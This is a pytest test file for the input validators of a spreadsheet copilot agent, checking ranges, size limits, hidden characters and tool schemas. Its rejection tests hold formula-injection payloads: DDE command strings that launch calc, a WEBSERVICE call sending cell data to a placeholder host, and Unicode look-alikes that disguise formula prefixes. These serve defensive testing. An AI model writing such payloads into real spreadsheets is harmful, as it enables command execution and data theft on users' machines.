import pytest
from pydantic import ValidationError

from onboarding_agent.copilot import schemas as sc
from onboarding_agent.copilot.rules import MAX_FORMULA_CHARS


def test_registry_names() -> None:
    assert sc.ALL_TOOLS == sc.CLIENT_TOOLS | sc.SERVER_TOOLS | sc.PROPOSAL_TOOLS
    assert {"list_sheets", "describe_sheet", "read_range", "find", "get_selection"} == sc.CLIENT_TOOLS
    assert {"run_state", "run_findings", "check_changes"} == sc.SERVER_TOOLS
    assert {"propose_changes", "propose_write"} == sc.PROPOSAL_TOOLS
    assert {"approve", "gate", "acknowledge", "history", "upload", "artifact", "http", "fetch", "shell"}.isdisjoint(
        sc.ALL_TOOLS
    )
    assert set(sc.TOOL_MODELS) == sc.ALL_TOOLS


def test_step_in_exactly_one() -> None:
    with pytest.raises(ValidationError):
        sc.StepIn()
    with pytest.raises(ValidationError):
        sc.StepIn(user_message="hi", tool_results=[sc.ToolResultIn(call_id="c", ok=True, content=1)])
    assert sc.StepIn(user_message="hi").user_message == "hi"
    with pytest.raises(ValidationError):
        sc.StepIn(tool_results=[])
    with pytest.raises(ValidationError):
        sc.StepIn(user_message="   \n ")
    assert sc.StepIn(user_message="  hi ").user_message == "hi"
    with pytest.raises(ValidationError):
        sc.StepIn(user_message="x" * 8001)


def test_range_canonical_and_validated() -> None:
    assert sc.ReadRange(sheet="S", range="$b2:a1").range == "A1:B2"
    assert sc.ReadRange(sheet="S", range="c3").range == "C3"
    for bad in ("A:A", "1:1", "S!A1", "A1:B2 ", "", "A0"):
        with pytest.raises(ValidationError):
            sc.ReadRange(sheet="S", range=bad)
    for bad in ("a/b", "", "x" * 32, "History", "a​"):
        with pytest.raises(ValidationError):
            sc.ReadRange(sheet=bad, range="A1")
        with pytest.raises(ValidationError):
            sc.DescribeSheet(sheet=bad)
    with pytest.raises(ValidationError):
        sc.Find(text="x", sheet="a/b")
    assert sc.Find(text="x").sheet is None
    with pytest.raises(ValidationError):
        sc.Find(text="")


def test_extra_fields_forbidden() -> None:
    with pytest.raises(ValidationError):
        sc.ListSheets(foo=1)  # type: ignore[call-arg]


def test_findings_severity() -> None:
    assert sc.RunFindings().severity is None
    with pytest.raises(ValidationError):
        sc.RunFindings(severity="fatal")  # type: ignore[arg-type]


def test_propose_write_one_of() -> None:
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1")
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", values=[[1]], formulas=[["=1"]])
    w = sc.ProposeWrite(sheet="S", range="b2:c2", values=[["x", 1.5]])
    assert w.range == "B2:C2"


def test_propose_write_formulas() -> None:
    assert sc.ProposeWrite(sheet="S", range="A1:A2", formulas=[["=SUM(B1:B2)"], ["=1+1"]]).formulas
    for bad in ("1+1", " =1", '=WEBSERVICE("x")', '=HYPERLINK("x")', "=cmd|'/c calc'!A1"):
        with pytest.raises(ValidationError):
            sc.ProposeWrite(sheet="S", range="A1", formulas=[[bad]])
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", formulas=[["=" + "1" * MAX_FORMULA_CHARS]])


def test_propose_write_calls_validators(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[str] = []
    real = sc.check_formula
    monkeypatch.setattr(sc, "check_formula", lambda f: (calls.append(f), real(f))[1])
    sc.ProposeWrite(sheet="S", range="A1:B1", formulas=[["=1", "=2"]])
    assert calls == ["=1", "=2"]


def test_propose_write_long_formula_rejected_before_check(monkeypatch: pytest.MonkeyPatch) -> None:
    def boom(_: str) -> None:
        raise AssertionError("check_formula called")

    monkeypatch.setattr(sc, "check_formula", boom)
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", formulas=[["=" + "1" * MAX_FORMULA_CHARS]])


def test_propose_write_shape_and_payload() -> None:
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1:B2", values=[[1, 2]])
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1:B2", values=[[1, 2], [3]])
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1:A2", formulas=[["=1"]])
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", values=[[[1]]])  # type: ignore[list-item]
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", values=[[{"a": 1}]])  # type: ignore[list-item]
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", values=[1])  # type: ignore[list-item]


def test_propose_write_ceiling() -> None:
    row = [0] * 1000
    with pytest.raises(ValidationError):
        sc.ReadRange(sheet="S", range="A1:ALL21")
    assert sc.ReadRange(sheet="S", range="A1:ALL20").range == "A1:ALL20"
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1:ALL101", values=[row] * 101)
    # in-range but over the schema ceiling is rejected before shape checks matter
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", values=[row] * 101)


def test_tool_result_and_outputs() -> None:
    assert sc.StepOut(status="final", text="x").proposed_writes == []
    assert sc.ToolCallOut(id="1", name="find", args={}).name == "find"
    with pytest.raises(ValidationError):
        sc.StepOut(status="weird")  # type: ignore[arg-type]


def _v(vals: list[list[object]]) -> sc.ProposeWrite:
    return sc.ProposeWrite(sheet="S", range=f"A1:{'ABCDEFG'[len(vals[0]) - 1]}{len(vals)}", values=vals)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "bad",
    [
        '=WEBSERVICE("http://x/"&A1)',
        "+cmd|' /c calc'!A0",
        "@SUM(1)",
        "-1+1",
        "- 5",
        " =1+1",
        "\t=1",
        "\r1",
        "\t1",
        "\u200b=1",
        "\xa0@x",
        "\n=1",
        "-",
        "+3.5x",
        "\uff1d1+1",
        "\uff0bcmd|x",
        "\uff20SUM(1)",
        "\uff0dx",
        "\u2212x",
        "\u22125",
        "-1e",
    ],
)
def test_values_reject_formula_like_text(bad: str) -> None:
    with pytest.raises(ValidationError, match="use the formulas field"):
        _v([[bad]])


@pytest.mark.parametrize(
    "ok", ["-5", "+3.5", "-0.25", " -5 ", "5", "abc", "a=b", "x-1", ".5", "-.5", "5.", "-1e20", "-1e3", "+2.5E-7"]
)
def test_values_allow_plain_and_numeric_text(ok: str) -> None:
    assert _v([[ok]]).values == [[ok]]


def test_values_numbers_and_none_pass() -> None:
    assert _v([[-5, 2.5, None, True, "ok"]]).values == [[-5, 2.5, None, True, "ok"]]


def test_formulas_still_checked() -> None:
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", formulas=[["="]])
    with pytest.raises(ValidationError):
        sc.ProposeWrite(sheet="S", range="A1", formulas=[['=WEBSERVICE("x")']])


def test_tool_result_in_strict() -> None:
    R = sc.ToolResultIn
    assert R(call_id="call_1-a", ok=True, content={"a": [1]}).ok
    for bad_id in ("", "a b", "a\n", "x" * 81, "a/b"):
        with pytest.raises(ValidationError):
            R(call_id=bad_id, ok=True)
    with pytest.raises(ValidationError):
        R(call_id="c", ok="yes")  # type: ignore[arg-type]
    with pytest.raises(ValidationError):
        R(call_id="c", ok=1)  # type: ignore[arg-type]


def test_tool_result_content_bounds() -> None:
    deep: object = 1
    for _ in range(9):
        deep = [deep]
    with pytest.raises(ValidationError):
        sc.ToolResultIn(call_id="c", ok=True, content=deep)
    ok: object = 1
    for _ in range(8):
        ok = [ok]
    sc.ToolResultIn(call_id="c", ok=True, content=ok)
    very_deep: object = 1
    for _ in range(100_000):
        very_deep = [very_deep]
    with pytest.raises(ValidationError):
        sc.ToolResultIn(call_id="c", ok=True, content=very_deep)
    with pytest.raises(ValidationError):
        sc.ToolResultIn(call_id="c", ok=True, content={"a": "x" * 1_000_001})
    with pytest.raises(ValidationError):
        sc.ToolResultIn(call_id="c", ok=True, content={1: 2})
    with pytest.raises(ValidationError):
        sc.ToolResultIn(call_id="c", ok=True, content=object())


def test_duplicate_call_ids_rejected() -> None:
    a = sc.ToolResultIn(call_id="c1", ok=True)
    with pytest.raises(ValidationError):
        sc.StepIn(tool_results=[a, a])
    assert sc.StepIn(tool_results=[a, sc.ToolResultIn(call_id="c2", ok=False)])


def test_start_in_run_id() -> None:
    assert sc.StartIn().run_id is None
    assert sc.StartIn(run_id="run-0123456789ab").run_id == "run-0123456789ab"
    for bad in ("", "run-1\n", "x", "run-xyz", "run-" + "a" * 40):
        with pytest.raises(ValidationError):
            sc.StartIn(run_id=bad)


def test_text_fields_reject_control_chars() -> None:
    with pytest.raises(ValidationError):
        sc.Find(text="a\x00b")
    with pytest.raises(ValidationError):
        sc.Find(text="a\u200bb")
    with pytest.raises(ValidationError):
        sc.Find(text="   ")
    assert sc.Find(text="  x ").text == "x"
    assert sc.ProposeWrite(sheet="S", range="A1", values=[[1]], note="a\nb").note == "a\nb"
    for bad in ("a\tb", "a\x00", "a\u202eb"):
        with pytest.raises(ValidationError):
            sc.ProposeWrite(sheet="S", range="A1", values=[[1]], note=bad)
        with pytest.raises(ValidationError):
            sc.ProposeChanges(restated=bad, changes=[])
    one = [{"kind": "set_header_row", "header_row": 2}]
    assert sc.ProposeChanges(restated="a\nb", changes=one).restated == "a\nb"  # type: ignore[arg-type]
    for empty in ("", "   ", "\n"):
        with pytest.raises(ValidationError):
            sc.ProposeChanges(restated=empty, changes=one)  # type: ignore[arg-type]


def test_values_rejection_message_is_accurate() -> None:
    with pytest.raises(ValidationError) as e:
        _v([["=1"]])
    assert "plain numbers" in str(e.value)


@pytest.mark.parametrize("bad", [float("nan"), float("inf"), float("-inf")])
def test_tool_result_content_rejects_non_finite(bad: float) -> None:
    with pytest.raises(ValidationError):
        sc.ToolResultIn(call_id="c", ok=True, content={"values": [[bad]]})


ACK = {"kind": "acknowledge_finding", "code": "X", "row": None}


def test_acknowledge_finding_not_offered() -> None:
    with pytest.raises(ValidationError):
        sc.CheckChanges(changes=[ACK])  # type: ignore[list-item]
    with pytest.raises(ValidationError):
        sc.ProposeChanges(restated="r", changes=[ACK])  # type: ignore[list-item]
    with pytest.raises(ValidationError):
        sc.StepOut(status="final", proposed_changes=[ACK])  # type: ignore[list-item]


def test_change_variants_accepted_and_bounded() -> None:
    good = [
        {"kind": "set_sheet", "sheet": "S"},
        {"kind": "set_header_row", "header_row": 3},
        {"kind": "set_column_binding", "field": "affiliate_id", "column": "A"},
        {"kind": "set_item_type", "value": "Inventory", "rows": [2, 3]},
        {"kind": "override_item_id", "row": 2, "value": "X"},
        {"kind": "exclude_row", "row": 2, "reason": "dup"},
        {"kind": "request_recipe_revision", "instruction": "do it"},
    ]
    c = sc.ProposeChanges(restated="r", changes=good)  # type: ignore[arg-type]
    assert [x.kind for x in c.changes] == [g["kind"] for g in good]
    with pytest.raises(ValidationError):
        sc.CheckChanges(changes=[{"kind": "exclude_row", "row": 2, "reason": "x" * 2001}])  # type: ignore[list-item]
    with pytest.raises(ValidationError):
        sc.CheckChanges(changes=[{"kind": "set_sheet", "sheet": "x" * 201}])  # type: ignore[list-item]
    with pytest.raises(ValidationError):
        sc.CheckChanges(changes=[{"kind": "set_sheet"}])  # type: ignore[list-item]  # kind present, sheet missing
    with pytest.raises(ValidationError):
        sc.CheckChanges(changes=[{"sheet": "S"}])  # type: ignore[list-item]  # kind required


def test_tool_specs() -> None:
    import json

    import jsonschema
    from langchain_core.utils.function_calling import convert_to_openai_tool

    specs = sc.tool_specs()
    assert {s["function"]["name"] for s in specs} == sc.ALL_TOOLS
    assert len(specs) == len(sc.ALL_TOOLS) == len(sc.TOOL_MODELS)
    for s in specs:
        assert s["type"] == "function"
        fn = s["function"]
        assert fn["description"].strip()
        params = fn["parameters"]
        jsonschema.Draft202012Validator.check_schema(params)
        assert params["type"] == "object" and params["additionalProperties"] is False
        assert "$defs" not in params and "$ref" not in json.dumps(params)
        assert convert_to_openai_tool(s) == s
        assert len(json.dumps(s)) < 6000

    def walk(node: object) -> None:
        if isinstance(node, dict):
            props = node.get("properties")
            if isinstance(props, dict) and "kind" in props:
                assert "kind" in node["required"]
                assert node["additionalProperties"] is False
            for v in node.values():
                walk(v)
        elif isinstance(node, list):
            for v in node:
                walk(v)

    by = {s["function"]["name"]: s["function"]["parameters"] for s in specs}
    walk(by["check_changes"])
    walk(by["propose_changes"])
    assert "acknowledge_finding" not in json.dumps(by)
    assert json.dumps(by["check_changes"]).count("set_sheet") == 1


def test_tool_specs_validate_round_trip() -> None:
    import jsonschema

    args = {
        "propose_write": {"sheet": "S", "range": "A1", "values": [[1]]},
        "read_range": {"sheet": "S", "range": "A1"},
    }
    by = {s["function"]["name"]: s["function"]["parameters"] for s in sc.tool_specs()}
    for name, a in args.items():
        jsonschema.validate(a, by[name])
        sc.TOOL_MODELS[name].model_validate(a)
    with pytest.raises(jsonschema.ValidationError):
        jsonschema.validate({"sheet": "S"}, by["read_range"])


@pytest.mark.parametrize(("raw", "out"), [("", ""), ("​", ""), ("​­﻿", ""), ("a", "a")])
def test_values_empty_and_invisible_only_accepted(raw: str, out: str) -> None:
    assert _v([[raw]]).values == [[out]]


@pytest.mark.parametrize("bad", ["⩵cmd", "⩶x", "⩵", "﹦x"])
def test_values_reject_multichar_nfkc_leads(bad: str) -> None:
    with pytest.raises(ValidationError, match="use the formulas field"):
        _v([[bad]])


def test_propose_changes_needs_a_change() -> None:
    with pytest.raises(ValidationError):
        sc.ProposeChanges(restated="r", changes=[])


@pytest.mark.parametrize("bad", ["a\ud800b", "x\udfff", "a\x00b", "a‮b", "a​b", "a\x1bb"])
def test_user_message_rejects_hidden_and_surrogates(bad: str) -> None:
    with pytest.raises(ValidationError):
        sc.StepIn(user_message=bad)


def test_user_message_keeps_newlines_and_tabs() -> None:
    assert sc.StepIn(user_message="a\n\tb\r\nc").user_message == "a\n\tb\nc"


def test_values_cell_length_is_counted_in_utf16_units_and_refused_not_truncated() -> None:
    limit = sc.EXCEL_CELL_CHARS
    assert limit == 32767
    assert _v([["a" * limit]]).values == [["a" * limit]]
    assert _v([["\U0001f600" * 16383 + "a"]]).values == [["\U0001f600" * 16383 + "a"]]  # 32767 UTF-16 units
    assert _v([["a" * limit + "​"]]).values == [["a" * limit]]  # hidden characters are stripped first
    for bad in ("a" * (limit + 1), "\U0001f600" * 16384, "a" * (5 * limit)):
        with pytest.raises(ValidationError, match="longer than Excel's cell limit"):
            _v([[bad]])
